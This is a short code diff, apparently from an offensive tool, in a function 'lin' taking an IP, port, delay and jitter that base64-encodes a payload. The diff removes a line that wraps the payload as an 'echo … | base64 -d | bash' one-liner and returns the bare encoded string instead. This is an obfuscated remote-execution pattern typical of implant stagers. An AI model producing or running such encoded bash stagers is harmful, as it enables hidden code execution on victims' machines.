@@ -110,6 +110,5 @@ def lin(ip, port, delay, jitter):
     """
     payload = parameters + code
     b64 = base64.b64encode(payload.encode("utf-8")).decode("utf-8")
-    enc_payload = "echo " + b64 + " | base64 -d | bash"
 
-    return enc_payload
+    return b64
